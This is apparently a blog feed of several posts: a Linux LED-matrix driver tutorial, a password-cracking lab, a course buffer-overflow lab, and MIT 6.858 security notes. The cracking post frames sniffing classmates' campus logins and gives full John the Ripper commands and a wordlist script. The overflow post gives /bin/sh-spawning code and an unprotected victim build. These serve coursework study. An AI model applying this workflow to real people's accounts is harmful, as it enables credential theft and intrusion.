0x82); writeData(0x05, 0x44); writeData(0x06, 0x28); writeData(0x07, 0x10); writeData(0x08, 0x00); &#125; 为了看到上述代码的运行效果，首先将MAX7219的VCC引脚连接到5V正极，GND引脚接地，CLK引脚接到树莓派板卡的GPIO11，DIN接到GPIO10，LOAD/CS引脚接到GPIO8，再利用export启用GPIO8、GPIO10、GPIO11三个引脚。编译上述代码，然后以root权限运行程序(只有root能读写direction、value文件)，当然，也可以通过chmod命令修改direction、value文件的权限，再以普通用户的身份运行程序。LED点阵显示效果如下所示： 设计字符设备驱动程序 通过前面的实验，我们应该能够熟练操作GPIO来控制LED点阵的显示了，现在我们开始为设备编写驱动程序，为用户提供更为抽象的控制接口。我们的目标是，用户能够通过write函数写入一串字符串，然后LED点阵将该字符串以每个字符停留500ms的速度依此显示。 在编写代码之前，我们需要了解一些设备驱动程序的基本知识。我们知道Linux对设备的操作是通过调用驱动程序来实现的，但驱动程序那么多，Linux怎么知道设备对应的驱动是哪个？其实，设备与驱动之间的map关系是通过一个Major number和Minor number来实现的，我们可以通过ls -l /dev查看设备的Major number和Minor number：1234pi@raspberrypi ~/Documents/Driver $ ls -l /dev/mmcblk0*brw-rw---T 1 root floppy 179, 0 Jun 4 11:17 /dev/mmcblk0 # 179为Major number 0为Minor numberbrw-rw---T 1 root floppy 179, 1 Jun 4 11:17 /dev/mmcblk0p1brw-rw---T 1 root floppy 179, 2 Jun 4 11:17 /dev/mmcblk0p2 Major number用于区分不同类型的设备，而Minor number用于区分同一类型的不同设备，所以Major number才是真正将设备和驱动map到一起的关键数。那我们怎么才能为设备驱动程序注册一个Major number呢？这里就要引入两个函数：1234// 为字符设备驱动程序注册Major numberint register_chrdev(unsigned int major,const char *name,struct file_operations *fops);// 取消之前的注册void unregister_chrdev(unsigned int major, const char *name); 我们可以通过register_chrdev这个函数来为字符设备驱动程序注册一个Major number，这个函数调用需要三个参数，分别为我们指定的Major number、设备名字以及文件操作结构，前面两个参数好理解，最后的文件操作结构又是啥呢？ 其实，file_operations这个结构就是用来指明操作设备会调用哪些函数，具体如下所示：123456static struct file_operations fops = &#123; .read = dev_read, // 读取设备时调用dev_read函数 .open = dev_open, // 打开设备时调用dev_open函数 .write = dev_write, // 写设备时调用dev_write函数 .release = dev_rls // 关闭设备时调用dev_rls函数&#125;; 此时，相信你已经对字符设备驱动程序的框架有一定的理解了，这里简单总结一下，我们需要为几个常见的文件操作，比如打开、读写以及关闭，设计对应的操作函数，使用结构file_operations存放这些函数地址，然后利用register_chrdev函数为驱动注册一个Major number，这个数不能与现有的驱动冲突(可以通过cat /proc/devices查看当前所有设备驱动的Major number)！之后我们利用mknod命令创建一个Major number相同的设备文件，当我们操作该设备文件时，Linux就会找到我们的驱动程序，并根据file_operations结构找到相应的处理函数，执行该函数来完成这次操作。明白了这些原理，接下来就是真正地代码实现了。 首先我们会遇到一个问题，register_chrdev和unregister_chrdev函数只能在内核态调用，用户态下是不可能注册驱动程序的，此时我们该怎么处理呢？有没有办法让自己的程序进入内核态运行？答案是肯定的，我们可以使用装载内核模块来实现对设备驱动程序的注册(这里我假设你已经对内核模块有一定的了解，甚至有过一些实践，如果你没有接触过内核模块，建议搜索相关资料先了解一下)，代码框架如下所示：123456789101112131415161718192021222324static struct file_operations fops = &#123; .read = dev_read, .open = dev_open, .write = dev_write, .release = dev_rls&#125;;static int dev_open(struct inode *i, struct file *f);static ssize_t dev_read(struct file *f, char *buf, size_t len, loff_t *off);static ssize_t dev_write(struct file *f, const char *buf, size_t len, loff_t *off);static int dev_rls(struct inode *i, struct file *f);int init_module(void) &#123; // 装载模块时会执行这个函数 int t = register_chrdev(218, "ledDev", &amp;fops); // 为驱动注册Major number为218 if (t &lt; 0) printk(KERN_ALERT "Device registration failed.\n"); else printk(KERN_ALERT "Device registered.\n"); return 0;&#125;void cleanup_module(void) &#123; // 卸载模块时会执行这个函数 unregister_chrdev(218, "ledDev"); printk(KERN_ALERT "Device unregistered.\n");&#125; 有了这个框架，想必你已经有一些具体的实现思路了。对于我们的LED点阵设备，我们不需要读，只需要实现写操作，而写操作在之前的GPIO控制部分中已经有所涉及，看来我们离最终的目标已经不远了。不过，还有一个严峻的问题摆在我们面前，我们之前实现的控制LED点阵显示字符涉及到了大量文件I/O，然而Linux在内核态是无法使用libc的，而且Linux Kernel开发者一再说明，永远不要在内核代码中读写文件，因为这可能会给系统带来无穷的麻烦(如果你想了解更多，请参阅这篇文档)，事实确实如此，因为我最初版本的驱动程序就直接导致了系统崩溃，后来调试过程中也多次造成了segment overflow错误。然而，本次实验对LED点阵的控制必须要通过操纵value文件来实现，我们也只好强撸一把了。这里直接贴出我设计的文件I/O函数：1234567891011121314151617181920212223242526272829struct file *openFile(const char *path) &#123; struct file *fil = NULL; mm_segment_t old_fs; printk(KERN_ALERT "&gt;&gt;&gt; openFile triggered.\n"); old_fs = get_fs(); set_fs(get_ds()); fil = filp_open(path, O_RDWR, 0664); set_fs(old_fs); return fil;&#125;static int writeFile(struct file *fil, const char *buf, size_t len) &#123; mm_segment_t old_fs; loff_t off = 0; int ret; //printk(KERN_ALERT "&gt;&gt;&gt; writeFile triggered.\n"); old_fs = get_fs(); set_fs(get_ds()); ret = vfs_write(fil, buf, len, &amp;off); set_fs(old_fs); return ret;&#125;static void closeFile(struct file *fil) &#123; printk(KERN_ALERT "&gt;&gt;&gt; closeFile triggered.\n"); filp_close(fil, NULL);&#125; 注意到，我们使用到了set_fs()来解决地址空间的不对应问题，这里我其实也没理解透，所以不敢多做解释，有兴趣的同学可以参阅这篇文档。 如上，我们实现了在内核态对文件进行读写操作的封装函数，现在可以正式写LED点阵的控制代码了！首先是打开设备文件时的操作：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152// open devicestatic int dev_open(struct inode *i, struct file *f) &#123;

return 0;&#125;static void exportPin(void) &#123; struct file *f; printk(KERN_ALERT "Start export pin.\n"); f = openFile("/sys/class/gpio/export"); if (f == NULL) &#123; printk(KERN_ALERT "Cannot open /sys/class/gpio/export\n"); return; &#125; writeFile(f, "8", 1); writeFile(f, "10", 2); writeFile(f, "11", 2); closeFile(f);&#125;static void setDirection(void) &#123; struct file *f; printk(KERN_ALERT "Start set direction.\n");

printk(KERN_ALERT "Start open pin.\n"); pinCS = openFile("/sys/class/gpio/gpio8/value"); pinDIN = openFile("/sys/class/gpio/gpio10/value"); pinCLK = openFile("/sys/class/gpio/gpio11/value");&#125;static void pinInit(void) &#123;

len + 1) &#123; if (i == 0) &#123; writeChar(0xFF, j, 0); // 先输出空白字符 writeChar(str[0], 0, 8-j); // 逐步滚入第一个字符 &#125; else if (i &lt; len) &#123; writeChar(str[i-1], j, 0); // 前一个字符持续左移，改变的是字体起始列号 writeChar(str[i], 0, 8-j); // 后一个字符跟进，改变的是LED点阵偏移列号 &#125; else if (i == len) &#123; writeChar(str[i-1], j, 0); // 最后一个字符滚出 writeChar(0xFF, 0, 8-j); // 补上空白字符 &#125; j++; if (j == 9) &#123; i++; j = 1; &#125; set_current_state(TASK_INTERRUPTIBLE); schedule_timeout(0.1*HZ); // 每过0.1秒更新一次 &#125;&#125; 修改后的两个函数逻辑变得更加复杂了，可能有些难以理解，我简单解释一下。首先是writeChar函数，此时它会接收三个参数，分别是显示字符、起始位置、偏移位置。我们知道，字体和LED点阵其实都是8x8的矩阵，这里的起始位置start表示的就是显示字符字体的起始列号，而偏移位置表示的是LED点阵的偏移列号。用实际例子来解释更为直观：对于传入参数c = &#39;a&#39;, start = 3, offset = 4，此时writeChar函数的行为就是从LED点阵的第5(offset+1)列输出字符&#39;a&#39;对应字体的第3(start)列，同理LED点阵第6列输出字体的第4列，以此类推，直到LED点阵列号超过8或者字体列号超过7时才停止输出，而对于LED点阵前面四列，我们这里不做处理。可能有人不理解为什么offset对应的是++offset，而start对应的是start++，这里解释一下：LED点阵列号是从1开始计数，字体列号从0开始计数，而我们希望它们对外全部表现为从0开始计数，所以传入的offset需要先加1才能作为真正的LED点阵列号。 有了writeChar的实现，我们写writeString就简单多了，仅仅需要处理好两个字符的同时显示。我的设计目标是，先输出空白字符0xFF，然后字符串的各个字符依次滚动进入，直到最后一个字符全部离开LED点阵才停止输出。总共实现分为三步，代码上有简单的注释，我觉得这里很难讲清所有细节，比如为什么j == 9时才会让它复位为1，为什么不复位为0，为什么点阵偏移列号是8-j而不是其他数… …如果你真的想理解这些细节问题，建议用笔在纸上模拟一下字符的滚动，然后理解一下writeChar函数，相信你能很快将writeString滚动输出的设计细节弄清楚。 最后，贴上字符串滚动输出的显示效果(若无法观看动态图，请点击链接)： Reference 课程提供的资料(包含中英文版的datasheet以及参考代码) Writing a Linux character Device Driver The Linux Kernel Module Programming Guide Max7219 Wheel in Python Linux Device Drivers, 2nd Edition Driving Me Nuts - Things You Never Should Do in the Kernel How to read/write files within a Linux kernel module]]></content>

    <content type="text"><![CDATA[假设这么一个场景：你和几个同学在一间教室里上课，大家都通过校园wifi上网，你想获取他们的教务网密码，于是你开始抓包，然后故意找机会让那几位同学尝试登陆教务网(这里就是社工了)，最后你根据抓到的数据包开始尝试破解登陆密码。 Start from here 假设这是你抓到的数据包: password.pcap。我们知道，即便只是一次普普通通的教务网登陆过程，其中也会涉及到很多次的信息交互，比如TCP三次握手、四次挥手，HTTP各种请求与响应等等，所以我们抓到的包中有很多是无用的，我们真正关心的是那些携带了密码的数据包，那么怎么才能找到这些包呢？ 这里涉及到HTTP协议的一些细节，我们知道HTTP有两种认证方式，分别为基本认证(Basic Authentication)和摘要认证(Digest Authentication)，具体的细节这里不展开，我们只需要知道一点，无论采用哪种认证方式，HTTP请求包头部都会带有一个Authorization的字段，对应的值即为用户名+盐+密码经过hash后的字符串。 根据这一点特征，我们可以利用Wireshark分析抓到的数据包(password.pcap)，然后在filter里填入一个简简单单的规则http contains Authorization，即可过滤出真正带有认证信息的数据包： 可以看到，仅有十个数据包通过筛选，并且从HTTP请求头部可以看出，用户身份认证采用的是基本认证的方式，而基本认证无法向传输的Credentials提供有意义的安全保护，仅仅是将其进行Base64编码。我们可以直接提取到用户密码信息，比如对于上图显示的HTTP认证包，用户Credentials即为user1:$1$foo$xxxxxxx，这里user1表示用户名，\$1表示hash类型为MD5，$foo表示采用foo作为hash的盐，最后一串字符即为密码的hash结果。我们可以将十个数据包里的所有Credentials全部提取下来，存入一个文件中，然后开始对密码进行破解。 这里我们使用John the Ripper对密码进行破解，John是一个非常强大的工具，这里不展开，直接在实践过程中介绍其用法。 下载John的源码压缩包之后，将其解压，然后根据README文档的指导直接编译安装即可。安装完成后，进入run目录，注意到该目录下有这么几个文件：john、password.lst、john.conf，其中john不用说，就是我们用来破解密码的可执行程序，password.lst是官方默认的一个密码字典，里面存放了3000多个简单密码，john.conf顾名思义就是破解密码时所用到的规则信息。 建议大家在真正使用John之前，先看一下doc目录下的各个文档，尤其是EXAMPLES和RULES两个文档，这两篇文档详细介绍了John的各种使用方法以及所有规则的含义。 将前面抓到的10条Credentials保存为文件allpasswd，首先，我们尝试最简单的破解方法：12345678~/Documents/*** ⌚ 20:36:24$ ./john --single allpasswdLoaded 10 password hashes with no different salts (md5crypt [MD5 32/64 X2])Press 'q' or Ctrl-C to abort, almost any other key for statususer1 (user1)1g 0:00:00:00 100% 1.612g/s 11998p/s 11998c/s 108001C/s user21900Use the "--show" option to display all of the cracked passwords reliablySession completed 注意到，我们成功破解出了用户user1的密码，即为user1！这个是怎么破解出来的呢？其实我们这里是用到了John一个最基本的模式——Single Crack，根据官方文档的说法(It will use the login names, “GECOS” / “Full Name” fields, and users’ home directory names as candidate passwords, also with a large set of mangling rules applied)，我们知道在这种模式下，John直接将用户名等账户信息作为候选密码来进行验证，同时也支持一些mangling rules，即我们能够通过自己设计规则，来生成更多的候选密码。举个例子，假设有这么一条规则：在输入字符串的末尾添加一个字母或数字，作为新的候选密码，那么对于用户user1，根据这么一个规则，我们知道user1、user1a、user1D、user19都将成为候选密码。总的来说，Single Crack这种模式速度非常快，因为它的输入不多，仅有几条有限的用户信息，当然，相对应地，由于它的输入局限于用户账户信息，这也导致它很难破解一些与用户名完全不同的密码。最明显的，上面的实践中，我们提供了10条用户Credentials，但John只破解出了user1的密码。 既然Single Crack模式无法破解所有密码，那么我们尝试使用官方自带的字典：12345678910~/Documents/*** ⌚ 20:36:29$ ./john --wordlist=password.lst allpasswdLoaded 10 password hashes with no different salts (md5crypt [MD5 32/64 X2])Remaining 9 password hashes with no different saltsPress 'q' or Ctrl-C to abort, almost any other key for statussmile (user3)admin (user2)2g 0:00:00:00 100% 5.882g/s 10429p/s 10429c/s 81617C/s notused..sssUse the "--show" option to display all of the cracked passwords reliablySession completed 我们又破解出了两个新密码！这次我们使用的是Wordlist模式，在这种模式下，John会打开我们指定的密码字典文件，将里面的所有字符串作为候选密码，一个个尝试去验证。所以说，一旦某个用户的密码在password.lst中出现了，那么这种模式就能很快地将其破解出来：1234567~/Documents/*** ⌚ 20:57:05$ grep -n '^smile$' password.lst104:smile~/Documents/*** ⌚ 20:57:20$ grep -n '^admin$' password.lst2823:admin 可以看到，smile和admin这两个密码确实存在于password.lst中。然而，仅仅几千条记录的字典无法覆盖所有用户的密码，如果用户密码没有出现在字典中，但和其中的某条记录很接近，比如字典中存在hello，而用户的密码是hel1lo，我们该怎么继续利用字典来破解这一密码呢？这里就需要用到John提供的mangling rules了，我们可以设计这么一条规则：12345&gt;[1-9] i\0[a-zA-Z0-9]# &gt;[1-9]表示对于1-9中的任意一个数字，当输入单词的长度比它大时，执行之后的规则# i代表insert，后面跟两个参数，分别为插入位置与插入字符，比如iNX表示在N位置上插入一个字符X# \0即为插入位置，举个例子，如果输入单词长度为6，那么这里的\0表示[1-5]，如果输入单词长度为12，那么这里的\0表示[1-9]，所以\0可以理解为是规则&gt;[1-9]的满足范围# [a-zA-Z0-9]即为插入字符，比较容易理解，就是普通正则的用法，这里表示插入一个英文字母或数字。 为了将规则应用到破解中，我们需要修改john.conf文件，在[List.Rules:Wordlist]一节添加这条规则；当然也可以直接新建一个john.conf文件，只使用这一条规则，如下所示：1234567891011121314[Options]# Wordlist file name, to be used in batch modeWordlist = $JOHN/password.lst# Use idle cycles onlyIdle = Y# Crash recovery file saving delay in secondsSave = 600# Beep when a password is found (who needs this anyway?)Beep = N# "Single crack" mode rules[List.Rules:Wordlist]:&gt;[0-9] i\0[a-zA-Z0-9&amp;!@#$%^&amp;*=+.|?:"'_-] # 密码不一定是数字或字母，也有可能是特殊字符 我们再次尝试破解，这次我们需要加上--rules选项，表示我们需要将定义的规则应用在字典单词上：1234567891011121314151617181920212223242526272829~/Documents/*** ⌚ 11:17:11$ ./john --fork=6 --wordlist=password.lst --rules allpasswdLoaded 10 password hashes with no different salts (md5crypt [MD5 32/64 X2])Remaining 7 password hashes with no different saltsNode numbers 1-6 of 6 (fork)Press 'q' or Ctrl-C to abort, almost any other key for statusalphab6et (user7)2 0g 0:00:00:25 100% 0g/s 11697p/s 11697c/s 81879C/s butterfly]1..rastafari]an6 1g 0:00:00:25 100% 0.03920g/s 11480p/s 11480c/s 79715C/s jesuschri]stpassworld (user8)1 0g 0:00:00:26 100% 0g/s 11398p/s 11398c/s 79788C/s jesucrist]o..nightshad]eWaiting for 5 children to terminate5 0g 0:00:00:26 100% 0g/s 11170p/s 11170c/s 78193C/s instructo]r..newaccoun]t3 1g 0:00:00:26 100% 0.03707g/s 10933p/s 10933c/s 76150C/s mancheste]r..bestfrien]ds4 0g 0:00:00:27 100% 0g/s 10757p/s 10757c/s 75299C/s jethrotul]lSession completed~/Documents/*** ⌚ 11:18:12$ ./john --show allpasswduser1:user1user2:adminuser3:smileuser7:alphab6etuser8:passworld5 password hashes cracked, 5 left~/Documents/*** ⌚ 11:18:12$ 现在已经成功破解了5个密码。然后，根据实验提示，字典文件提供了很多单词，而密码可能是两个单词的组合，比如helloworld就是hello和world的组合。所以我们需要将字典文件里的单词两两组合，重新验证，不过John貌似没有规则能够让我们同时接收两个单词，并组合起来进行验证，所以这里需要用到脚本程序，自己重新构造一个具有单词组合的新字典文件。脚本程序如下所示：12345678910111213141516171819########################################################################## File Name: tran.sh# Author: Hac# Mail: hac@zju.edu.cn# Created Time: Fri 20 May 2016 11:33:08 AM CST##########################################################################!/bin/bashfile=$1while read a;do while read b; do c=$a$b if [ $&#123;#c&#125; -le 10 ] &amp;&amp; [ $&#123;#c&#125; -ge 3 ]; then # 过滤掉那些比较长或比较短的组合 echo "$a$b" &gt;&gt; newPasswd.lst fi done &lt; $filedone &lt; $file 这个程序应该不难理解，直接通过两层循环读取单词，做一个笛卡尔积。运行这个脚本，我们能够在原字典文件的基础上，构造出一个新的字典文件，其中的单词全部是两个基础单词的组合。基于这个新的字典文件，我们再尝试使用之前的规则进行破解：12345678910111213141516171819202122232425~/Documents/*** ⌚ 22:50:44$ ./john --fork=6 --wordlist=newPasswd.lst --rules allpasswdLoaded 10 password hashes with no different salts (md5crypt [MD5 32/64 X2])Remaining 5 password hashes with no different saltsNode numbers 1-6 of 6 (fork)Press 'q' or Ctrl-C to abort, almost any other key for statuslovecats (user6)password222 (user4)amy!password (user9)love&amp;pizza (user10)Session completed~/Documents/*** ⌚ 23:17:07$ ./john --show allpasswduser1:user1user2:adminuser3:smileuser4:password222user6:lovecatsuser7:alphab6etuser8:passworlduser9:amy!passworduser10:love&amp;pizza9 password hashes cracked, 1 left 这次破解会花费很长时间，主要是因为所使用的字典文件更大了。原来的字典文件只有3500多行，而我们将其中的单词两两组合(排除过长或过短的密码)后，新字典文件的行数达到了千万级别。花费了非常多的时间，我们的收获还是挺大的，这一次我们直接破解出了4个密码，分别是user4、user6、user9以及user10。现在，10个用户中只剩下user5的密码没有破解出来。 还剩下一个用户的密码没有破解。如果此时没有任何提示信息，那么我们就可以动用John的另一种非常强大的工作模式——Incremental。根据官方文档的说明，Incremental是John最强大的一种工作模式，因为它会尝试所有可能的字符组合，说白了就是真正的暴力破解。这种模式并没有尽头，因为字符组合有太多可能性，几乎不太可能在有限时间内穷举出所有字符组合。不过我们可以通过指定密码长度的范围，来减小字符组合的可能性，从而使得Incremental模式下的John能更快地破解出密码。 12345678910111213141516171819# john.conf# Incremental modes[Incremental:ASCII]File = $JOHN/ascii.chrMinLen = 4MaxLen = 8CharCount = 95[Incremental:LM_ASCII]File = $JOHN/lm_ascii.chrMinLen = 4MaxLen = 8CharCount = 69[Incremental:Digits]File = $JOHN/digits.chrMinLen = 4MaxLen = 8CharCount = 10 下面我们尝试使用Incremental模式对最后一个用户密码进行破解： 123456789101112131415161718192021222324252627282930~/Documents/*** ⌚ 23:21:20$ ./john --fork=6 --incremental allpasswdLoaded 10 password hashes with no different salts (md5crypt [MD5 32/64 X2])Remaining 1 password hashNode numbers 1-6 of 6 (fork)Press 'q' or Ctrl-C to abort, almost any other key for statuspass2012 (user6)6 0g 0:00:01:00 0g/s 9890p/s 9890c/s 9890C/s lilachu..lilach13 0g 0:00:01:00 0g/s 9650p/s 9650c/s 9650C/s pops1c4..pops1c34 0g 0:00:01:00 0g/s 9681p/s 9681c/s 9681C/s 14015j..14014n2 0g 0:00:01:00 0g/s 10071p/s 10071c/s 10071C/s cattored..cattore15 0g 0:00:01:00 0g/s 9949p/s 9949c/s 9949C/s maydi15..maydi161 0g 0:00:01:00 0g/s 10252p/s 10252c/s 10252C/s chserz..chselyWaiting for 5 children to terminateSession aborted~/Documents*** ⌚ 23:22:48$ ./john --show allpasswduser1:user1user2:adminuser3:smileuser4:password222user5:pass2012user6:lovecatsuser7:alphab6etuser8:passworlduser9:amy!passworduser10:love&amp;pizza10 password hashes cracked, 0 left 如上所示，我们成功通过Incremental模式破解出了最后一个用户的密码。 Reference Lecture Homepage(仅学校内网可访问) John the Ripper官方文档(EXAMPLES和RULES两个章节非常重要)]]></content>

    <url>%2F2016%2F05%2F11%2FBuffer-Overflow%E5%AE%9E%E8%B7%B5%2F</url>
    <content type="text"><![CDATA[上个世纪末，Buffer Overflow是黑客最常用的攻击手段之一，主要原因是当时操作系统以及各种函数库都不够完善，并没有实现对堆栈的保护，黑客可以随意地冲破缓冲区长度限制，直接修改函数返回地址，使程序跳到黑客所希望的地方，让它做一些奇奇怪怪的事，从而达到攻击的目的。这样的攻击方法就叫Return-Oriented Programming，简称ROP。常见的实现手段有两种，其一是黑客向栈中注入自己设计的代码，然后将函数返回地址改成注入代码的起始位置，因此当函数返回时，程序就开始执行这段注入代码了，所以黑客想干嘛就能让程序干嘛。这种攻击方式非常强大，但有一个致命缺陷，它要求栈是可执行的(executable)，一旦栈是不可执行的，那么函数返回后，程序就因为错误而被终止(我们可以通过在gcc编译时加选项设定栈是否可执行)。另一种方法就是专门针对不可执行栈的，黑客不再向栈中注入自己的执行代码，而是通过各种黑科技来找到程序中的gadget(具体方法参照MIT 6-858第三节课，也有现成工具可以实现)，gadget是一些指令片段，常见的就是ret和pop的组合，黑客的目的在于，找到很多个这样的gadget后，将它们链接在一起，形成gadget chain，也就是一段执行代码。。。总的来说，黑客在无法自己注入代码时，他可以东拼西凑找现有的代码，把它们当成零件组装成自己想要的程序代码。这种实现方式难度极大，就跟拼图一样，真的要耐住性子才能成功。 MIT 6-858这门课的第一个实验就是分析一个web服务器的存在的漏洞，并利用这些漏洞实现Buffer Overflow攻击，分别涉及到可执行栈与不可执行栈，最后再修复这些漏洞。不得不说，MIT的实验难度和本校的实验难度完全不是一个level的，我们的实验是一种跟着做的形式，最后也只是跑了一个shell出来，而MIT的实验几乎就是真实的hack。我至今还没有完成这次实验，主要是自己对汇编不是很熟悉，然后也耐不住性子连续花上几天时间来调试，有兴趣的同学可以去看一下，这是链接。实验要求使用虚拟机跑MIT提供的系统镜像，保证运行环境一致，这里建议大家使用Linux+kvm来做实验，非常方便。 下面介绍我对Buffer Overflow的实践，内容是本校「信息安全综合实验」课程第二、三次实验——通过注入代码，使一个正常的程序能够运行shell。 Start from here 总的来说，实验思路还是挺明了的，我们需要自己设计一段能运行shell的汇编代码，然后汇编成机器码，并注入到某个程序的堆栈中，最后修改ip寄存器，使程序执行我们注入的这段代码，从而跑出一个shell来。实验难度也不大，主要是要有耐心，毕竟本次实验涉及到大量的GDB调试操作，对GDB命令不熟悉的同学可能会吃些亏，因为调试过程会使用到一些较为复杂的命令参数。当然，只使用光秃秃的原始命令也是能够完成实验的，但会浪费一些时间。另外，实验环境为64位Linux系统，所以难度可能会稍微大一些，因为网上关于Buffer Overflow的实践教程全部都是基于32位系统的，我们只能靠自己来慢慢摸索。 Design Shell Code 我们第一个任务是设计一串能够执行shell的机器指令，但我们知道，不同机器有不同的指令集，不同系统对系统调用的处理也不一样，那该怎么保证我们最终注入的代码能够正常工作呢？ 答案很简单，我们直接找一个能在目的主机上运行的程序，仿照设计。如下所示即为我们的样例程序：123456789// sample.c#include &lt;stdio.h&gt;int main() &#123; char *array[2]; array[0] = "/bin/sh"; array[1] = NULL; execve(array[0], array, NULL); return 0;&#125; 这个程序通过execve函数产生系统调用，使进程执行shell。我们可以观察该程序编译得到的汇编代码，找到执行shell需要哪些关键步骤，然后自己重新组织，即可设计出一串能执行shell的机器指令。 这里使用gcc进行编译，注意添加两种重要选项，分别是-g与-static，分别代表生成调试信息、采用静态链接，这样可以方便我们进行调试。编译完成后，使用GDB查看二进制文件的机器指令，如下所示：123456789101112131415161718192021222324252627# main function │0x401164 &lt;main&gt;

这里稍微解释一下程序中最为关键的一步：ret = (long long *)&amp;ret + 0x2;。参照我的另一篇博文Buffer Overflow(理论篇)，在程序执行过程中，栈的结构是这样的：12345678910111213# stack +----------------+entry %rbp ----&gt; |.. prev frame ..| | | | | +----------------+entry %rsp ----&gt; | return address | # 我们要修改的是这个位置 +----------------+new %rbp ----&gt; | saved %rbp | +----------------+ | Local | # &lt;------ ret指针就在这里new %rsp ----&gt; | Variables | +----------------+ 对于64位系统，return address、saved %rbp以及long long *所占用的空间都是8字节，因此，return address的地址要比ret的地址大16个字节，也就是2个long long *的长度！这么一说，想必大家都已经明白ret = (long long *)&amp;ret + 0x2的原理了，它最终会使得ret指向函数返回地址，从而我们能够通过修改*ret来实现对返回地址的修改。 最终测试程序运行如下所示： 至此，第一部分工作正式完成，我们已经为buffer overflow攻击打下了很好的基础，下面就是真正的实践了。 Exploit Buffer Overflow with GDB 我们已经完成恶意代码的设计，下面我们开始尝试将代码注入到一个很weak的程序中，使它能够按照我们的意愿来工作(其实就是执行shell啦)。目标程序代码如下所示： 123456789101112// victim.c#include &lt;stdio.h&gt;#include &lt;string.h&gt;void foo(char *arg) &#123; char buffer[64]; strcpy(buffer, arg);&#125;int main(int argc, char *argv[]) &#123; foo(argv[1]); return(0);&#125; 1234567# 编译目标代码3130104006@hamsa:~/project3$ gcc victim.c -g -Wall -fno-stack-protector -z execstack -static -o victim# -g 表示生成调试信息，方便使用GDB调试# -Wall 表示打开警告开关，提示所有warning信息# -fno-stack-protector 表示禁用栈保护机制，如果没有这个选项，本次实验无法完成。这里的栈保护机制其实就是canary# -z execstack 表示允许栈可执行，没有这个选项，本次实验也无法完成# -static 表示静态链接 为什么说这个程序很weak呢？这里用过Visual Studio的同学一定很有感受，如果我们的工程里有使用gets、strcpy这样的函数，那么编译时IDE一定会抱怨这些函数是dangerous的，蛋疼的是，它报的不是warning，而是error，这样也就导致工程无法编译。我们的目标程序刚好使用到了strcpy函数，这让我们有可趁之机，因为该函数并没有做边界限制，理论上来说，只要不遇到终止符\x00，它就会一直进行内存拷贝，我们利用这一特性，可以输入一串很长的数据，然后通过strcpy拷贝到本地变量buffer中，但由于我们输入的数据长度要超过buffer的长度，甚至还会覆盖到foo函数的返回地址字段，所以我们还能利用输入的数据将函数返回地址修改掉，使程序返回时跳到我们规定的位置(一般是注入代码的起始地址，也就是buffer的地址)，执行我们注入的代码，这就是buffer overflow攻击的一种实现原理。 根据实验原理，为了实现攻击，除了需要一段恶意代码之外，我们还需要知道这段恶意代码注入到内存中后的起始地址，如此才能正确覆写程序返回地址。这里，我们可以使用GDB来跟踪程序的运行，查看程序进入foo函数后，buffer的起始地址是多少。123456789101112131415161718# Debug victim program with GDB ┌─────────────────────────────────────────────────────────────────────────┐ │0x401164 &lt;foo&gt;

    <content type="text"><![CDATA[MIT OpencoursewareComputer System Security 6-858 IntroConsider the following simplified example code from a Web server.1234567int read_req() &#123; char buf[128]; int i; gets(buf); i = atoi(buf); return i;&#125; It’s dangerous because gets() has no bounds check. Thus, stack may be flushed by a long(more than 128 bytes) input sequence. Look as the architecture of stack in X86:1234567891011121314151617 +----------------+entry %ebp ----&gt; |.. prev frame ..| | | | | +----------------+entry %esp ----&gt; | return address | +----------------+new %ebp ----&gt; | saved %ebp | +----------------+ | i | +----------------+ | buf[127] | | ... | | buf[0] | +----------------+new %esp ----&gt; | ... | +----------------+ 12345678# read_req's code: push %ebp mov %esp -&gt; %ebp sub 168, %esp ... # program mov %ebp -&gt; %esp pop %ebp ret Since gets() has no bounds check, all data in stack might be overwrited by input sequence. Attackers can exploit this weakness and modify the return address of this function. The new return address may point to a uncharted area or even a malicious program. SolutionsStack Canaries1234567891011+------------+| ret addr |+------------+ ^| saved %ebp | |+------------+ || CANARY | | Overflow goes+------------+ | this way.| buf[127] | || ... | || buf[0] | |+------------+ Canary goes in front of return address on the stack, so that any overflow which rewrites the return address will also rewrite canary. Therefore, we can check canary before we ret from the function. Care that here we assume attackers can only rewrite the stack in a linear wayThat is to say, before rewriting ret addr, canary must be changed. Another important thing is that canary cannot be easily guessed by attackers. It is interesting that canary can use 0, CR, LF or -1, since these characters are terminated characters. When do canaries fail Overwrite function pointers before canary malloc() and free() 123456char *p, *q;p = malloc(1024);q = malloc(1024);strcpy(p, buf);free(q);free(p); Assume that p and q are nearby.Here is architecture of memory block: 123456789101112# Allocated block Free block +-----------+ +------------+ | | | size | | Data | +------------+ | | | ...empty | +-----------+ +------------+ | Size | | bkwd ptr | +-----------+ +------------+ | fwd ptr | +------------+ | size | +------------+ The buffer overrun in p(strcpy()) will overwrite the size value in q‘s memory block! When free() merges two adjacent free blocks, it needs to manipulate bkwd and fwd pointers, and pointer calculation uses size to determine where the free memory block structure lives! 12345p = get_free_block_struct(size);bck = p-&gt;bk;fwd = p-&gt;fd;fwd-&gt;bk = bck; // Writes memorybck-&gt;fd = fwd; // Writes memory By corrupting the size value, attackers can force free() to operate on a fake struct that resides in attacker-controlled memory and has attacker-controlled values for forward and backward pointers.reference Bounds Check Eletric fencesAlign each heap object with a guard page, and use page tables to ensure that accesses to the guard page cause a fault 1234567+----------+| Guard || | ^+----------+ | Overflows cause| Heap | | a page exception| obj | |+----------+ Eletric fences can’t protect the stack, and the memory overhead is too high to use in production systems. Fat pointerModify the pointer representation to include bounds information. Now, a pointer includes a memory address and bounds information about an object that lives in that memory region. 12345678910// Example: /* Regular 32-bit pointer */ +----------------+ | 4-byte address | +----------------+ /* Fat pointer */+-----------------+----------------+---------------------+| 4-byte obj_base | 4-byte obj_end | 4-byte curr_address |+-----------------+----------------+---------------------+ The program will be aborted if it dereferences a pointer whose address is outside of its own base-end range.However, it can be expensive to check all pointer dereferences; Also, fat pointers are incompatible with a lot of existing software. Baggy BoundsFor each alocated object, store how big the object is.There are 5 tricks in Baggy Bounds: Round up each allocation to a power of 2, and align the start of the allocation to that power of 2 Express each range limit as log2(alloc_size). For 32-bit pointers, only need 5 bits to express the possible ranges. Store limit info in a linear array: fast lookup with one byte per entry. Also, we can use virtual memory to allocate the array on-demand. Allocate memory at slot granularity(e.g. 16bytes): fewer array entries 1234567891011121314151617181920212223/* Memory Block */+-------+-------+-------+-------+| |+-------+-------+-------+-------+0 32 64 96 128a = malloc(28);+-------+-------+-------+-------+| a | |+-------+-------+-------+-------+0 32 64 96 128b = 